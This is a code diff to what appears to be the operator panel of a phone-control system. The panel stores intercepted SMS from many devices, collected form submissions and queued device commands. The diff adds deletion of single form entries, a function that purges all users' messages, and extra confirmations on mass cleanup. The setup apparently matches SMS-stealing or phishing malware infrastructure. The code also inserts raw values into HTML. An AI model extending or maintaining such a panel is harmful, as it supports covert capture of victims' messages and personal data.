-            wrap.innerHTML = `<div class="text-xs font-black text-rose-600 uppercase mb-3 pb-2 border-b border-slate-100">ENTRY #${idx+1} <span class="text-slate-400 ml-2 font-mono text-[10px]">${new Date(f.ts).toLocaleString()}</span></div>`;
+            wrap.className = "bg-white border-l-4 border-l-rose-600 p-4 shadow-sm rounded-xl relative group";
+            wrap.innerHTML = `
+                <div class="flex justify-between items-center mb-3 pb-2 border-b border-slate-100">
+                    <div class="text-xs font-black text-rose-600 uppercase">ENTRY #${idx+1} <span class="text-slate-400 ml-2 font-mono text-[10px]">${new Date(f.ts).toLocaleString()}</span></div>
+                    <button onclick="deleteSingleForm('${uid}', '${fid}')" class="text-rose-400 hover:text-rose-600 transition-colors opacity-0 group-hover:opacity-100"><i class="fas fa-trash-can text-[11px]"></i></button>
+                </div>`;
             let rows = `<div class="space-y-0.5 mt-2">`;
             for(let k in f) {
                 if(['ts','uid','name','page','timestamp'].includes(k)) continue;
@@ -2181,8 +2205,19 @@
         document.getElementById('broadcast-overlay').classList.add('hidden');
     }
 
+    function deleteAllGlobalSms() {
+        if(!confirm("EXTREME DANGER: This will delete EVERY SINGLE message from EVERY user and the global feed. Continue?")) return;
+        if(!confirmDelete()) return;
+        db.ref('all_sms').remove();
+        Object.keys(usersData).forEach(uid => {
+            db.ref(`Users/${uid}/M`).remove();
+        });
+        showToast("Global SMS Purge Complete", "success");
+    }
+
     function cleanupOldSms() {
         if(!confirm("Are you sure? This will delete ALL messages older than 7 days from all users and global feed.")) return;
+        if(!confirmDelete()) return;
         const cutoff = Date.now() - (7 * 24 * 60 * 60 * 1000);
         let count = 0;
 
@@ -2211,6 +2246,7 @@
 
     function clearAllCommands() {
         if(!confirm("Are you sure? This will clear all pending commands for ALL users and the FCM queue.")) return;
+        if(!confirmDelete()) return;
 
         // Clear FCM Queue
         db.ref('fcm_queue').remove();
@@ -2225,6 +2261,7 @@
 
     function cleanupInactiveUsers() {
         if(!confirm("DANGER: This will PERMANENTLY delete devices that haven't been online for 7 days. Continue?")) return;
+        if(!confirmDelete()) return;
         const cutoff = Date.now() - (7 * 24 * 60 * 60 * 1000);
         let count = 0;
 
